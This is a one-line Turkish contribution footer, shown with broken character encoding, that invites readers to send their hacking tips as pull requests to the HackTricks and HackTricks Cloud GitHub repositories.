* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud** github depolarÄ±na PR'lar gÃ¶ndererek paylaÅŸÄ±n.

</details>
